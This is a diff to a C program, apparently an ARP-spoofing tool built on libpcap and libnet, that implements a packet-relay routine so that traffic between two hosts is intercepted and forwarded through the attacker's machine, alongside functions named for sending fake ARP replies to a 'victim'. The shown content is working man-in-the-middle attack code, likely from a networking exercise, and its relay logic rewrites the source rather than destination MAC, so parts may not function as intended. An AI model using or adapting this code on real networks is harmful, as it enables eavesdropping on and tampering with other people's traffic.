@@ -7,8 +7,7 @@
 
 void print_mac(char * mac);
 void get_target_mac( 
-	char * victim_ip,char * victim_mac,
-	char * my_ip, char * my_mac);
+	char * victim_ip,char * victim_mac);
 void *send_fake_reply(
 	void * arg);
 
@@ -38,22 +37,20 @@ void sniffer(u_char * arg,const struct pcap_pkthdr * pkthdr,const u_char * packe
 
 char mydev[11]={};
 pcap_t * handler;
+uint32_t job_cnt;
+struct ip_info info[3]={};
+char my_ip[4]={};
+char my_mac[6]={};
 
 #define PACKET_SIZE 42
 
-int main(int argc,char * argv[]){
+int main(int argc, char * argv[]){
 	if(argc<4 || (argc%2 != 0) || argc>8)
 		usage();
 
-	uint32_t job_cnt = (argc/2)-1;
+	job_cnt =(argc/2)-1;
 	char * dev = argv[1];
-	struct ip_info info[3]={};
-	struct ip_info myinfo;
-
 	strncpy(mydev,dev,10);
-
-	
-
 	pcap_if_t * alldevs;
 
 	if (pcap_findalldevs(
@@ -64,8 +61,6 @@ int main(int argc,char * argv[]){
 		exit(1);
 	}
 
-	char my_ip[4]={};
-	char my_mac[6]={};
 	int tmp=0;
 
 	for(pcap_if_t * i = alldevs; i != NULL; i=i->next){
@@ -108,8 +103,7 @@ int main(int argc,char * argv[]){
 	for(int i=0;i<job_cnt;i++){
 		inet_pton(AF_INET, argv[(i+1)*2], &info[i].sender_ip);
 		inet_pton(AF_INET, argv[(i+1)*2+1], &info[i].target_ip);
-		get_target_mac(info[i].target_ip,info[i].target_mac,
-			my_ip,my_mac);
+		get_target_mac(info[i].target_ip,info[i].target_mac);
 		th_arg[i].target_ip = info[i].target_ip;
 		th_arg[i].target_mac = info[i].target_mac;
 		th_arg[i].sender_ip = info[i].sender_ip;
@@ -129,7 +123,28 @@ int main(int argc,char * argv[]){
 }
 
 void sniffer(u_char * arg,const struct pcap_pkthdr * pkthdr,const u_char * packet){
-	
+	struct libnet_ethernet_hdr * eth_hdr = 0;
+	struct libnet_arp_hdr * arp_hdr;
+
+	eth_hdr = (struct libnet_ethernet_hdr *)packet;
+	arp_hdr = (libnet_arp_hdr *)((char *)eth_hdr + 
+		sizeof(struct libnet_ethernet_hdr));
+	struct ip_info *ip_info = (struct ip_info *)((char *)arp_hdr + 
+		sizeof(struct libnet_arp_hdr));
+
+	for(int i=0;i<job_cnt;i++){
+		if((!memcmp(ip_info->sender_ip,info[i].target_ip,4)) && 
+			(!memcmp(ip_info->target_ip,info[i].sender_ip,4))){
+			printf("Relaying ");
+			print_ip(info[i].target_ip);
+			memcpy(eth_hdr->ether_shost,my_mac,6);
+			if(pcap_sendpacket(handler,(const u_char *)packet,pkthdr->len)==-1){
+				puts("pcap_sendpacket Error!");
+				break;
+			}
+
+		}
+	}
 }
 void print_ip(char * ip){
 	printf("%u.%u.%u.%u\n",ip[0]&0xff,ip[1]&0xff,ip[2]&0xff,ip[3]&0xff);
@@ -141,8 +156,7 @@ void print_mac(char * mac){
 }
 
 void get_target_mac(
-	char * victim_ip,char * victim_mac,
-	char * my_ip, char * my_mac)
+	char * victim_ip,char * victim_mac)
 {
 
 	struct libnet_ethernet_hdr * eth_hdr = 0;
